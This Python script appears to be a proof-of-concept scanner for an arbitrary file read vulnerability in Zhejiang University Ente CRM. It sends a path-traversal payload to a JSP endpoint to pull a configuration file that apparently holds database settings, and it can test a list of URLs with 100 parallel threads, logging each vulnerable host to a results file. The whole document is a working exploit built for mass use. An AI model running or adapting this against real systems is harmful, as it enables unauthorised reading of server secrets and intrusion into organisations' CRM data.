#浙大恩特客户资源管理系统 任意文件读取漏洞.py
import re,requests,argparse,sys,time
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings() # 解除警告
def banner():
    test = """   ____   ____  ____ _ ____  _ _____  ___  
 / ___| / ___|/ ___/ |___ \/ |___ / ( _ ) 
 \___ \| |  _| |  _| | __) | | |_ \ / _ \ 
  ___) | |_| | |_| | |/ __/| |___) | (_) |
 |____/ \____|\____|_|_____|_|____/ \___/ 
                                          
                                version:1.0.8 
                                author:guoguo12138                             
"""
    print(test)

def main():
    banner()
    parser = argparse.ArgumentParser(description="浙大恩特客户资源管理系统 任意文件读取漏洞")
    parser.add_argument('-u','--url',dest='url',type=str,help='input your link')
    parser.add_argument('-f','--file',dest='file',type=str,help='file path')

    args = parser.parse_args()

    if args.url and not args.file:
         poc(args.url)
    elif not args.url and args.file:
        url_list=[]
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"\n\tUage:python {sys.argv[0]} -h")
                
def poc(target):
    payload_url = '/entsoft/module/i0004_openFileByStream.jsp;.jpg?filepath=/../EnterCRM/bin/xy.properties&filename=conan'
    url = target + payload_url
    headers = {
        'Accept-Encoding':'gzip,deflate,br',
        'Accept':'*/*',
        'Accept-Language':'en-US;q=0.9,en;q=0.8',
        'User-Agent':'Mozilla/5.0(WindowsNT 10.0:Win64:x64)AppleWebKit/537.36(KHTML, likeGecko) Chrome/116.0.5845.111 Safari/537.36',
        'Connection':'close',
        'Cache-Control':'max-age=0'
    }
    
    try:
        res = requests.get(url=url,headers=headers,timeout=5,verify=False)
        
        if res.status_code == 200 and "db" in res.text:
            print(f"[+]该网站存在任意文件读取漏洞，url为{target}\n")
            with open("result.txt","a",encoding="utf-8") as fp:
                fp.write(target+'\n')
        else:
            print(f"[-]该网站不存在任意密码读取漏洞")

    except Exception as e:
        print(f"[*]该网站无法访问")

if __name__ == '__main__':
    main()
